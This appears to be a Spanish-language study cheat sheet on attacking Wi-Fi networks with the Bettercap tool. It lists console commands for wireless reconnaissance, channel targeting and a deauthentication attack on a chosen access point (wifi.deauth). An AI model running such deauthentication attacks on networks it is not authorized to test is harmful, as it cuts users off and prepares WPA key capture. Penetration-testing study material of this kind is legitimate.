# Ataques 

Tags: #Bettercap #Attack #WPA/WPA2 

##  Bettercap 

* [Bettercap](https://github.com/bettercap/bettercap)
* [How to use - Bettercap](https://null-byte.wonderhowto.com/how-to/hack-wi-fi-networks-with-bettercap-0194422/)

```bash 
❯ ./bettercap -iface wlan0mon                        # Ingresar a la consola intercativa 

	❯ wifi.recon on                                 # Activamos el modo reconocimiento  
	❯ set wifi.show.sort clients desc               # Ordenar por clientes de modo descendiente 
	❯ set ticker.commands 'clear: wifi.show'        # Limpieza cada seg y que nos muestre las redes disponibles 
		❯ ticker on                                # Representa la info en forma de tablas 
	❯ wifi.recon.channel 1                          # Enfocarnos en el canal 1
	❯ wifi.deauth <BSSI>                            # Haremos un ataque de deatenticacion 
	❯ Ctrl + z                                      # Terminar la sesion 
		❯ kill %                                   # Matar el proceso en segundo plano                      
```